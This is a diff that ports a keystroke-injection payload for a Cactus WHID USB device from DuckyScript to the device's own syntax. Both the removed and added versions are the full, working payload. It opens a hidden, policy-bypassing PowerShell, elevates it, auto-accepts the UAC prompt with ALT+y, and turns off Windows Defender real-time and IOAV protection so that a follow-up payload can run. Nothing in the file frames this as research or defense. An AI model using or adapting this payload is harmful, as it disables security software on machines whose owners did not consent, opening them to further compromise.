@@ -1,12 +1,10 @@
-REM === Cactus WHID Payload: Disable Windows Defender RTP ===
-REM Target: Windows 10/11 (requires admin UAC accept)
-REM Category: Utility (Evasion)
-REM Description: Disables Defender real-time monitoring for follow-up payload execution
-REM Note: Triggers UAC prompt - ALT y auto-accepts if user has admin rights
-DELAY 1000
-GUI r
-DELAY 500
-STRING powershell -NoP -W Hidden -Exec Bypass -C "Start-Process powershell -Verb RunAs -ArgumentList '-NoP -W Hidden -C Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true'"
-ENTER
-DELAY 1000
-ALT y
+Rem: Cactus WHID Payload - Disable Windows Defender RTP
+Rem: Target - Windows 10/11 (requires admin UAC accept)
+Rem: Disables Defender real-time monitoring for follow-up payload execution
+Rem: Triggers UAC prompt - ALT y auto-accepts if user has admin rights
+CustomDelay:1000
+Press:131+114
+CustomDelay:500
+PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "Start-Process powershell -Verb RunAs -ArgumentList '-NoP -W Hidden -C Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true'"
+CustomDelay:1000
+Press:130+121
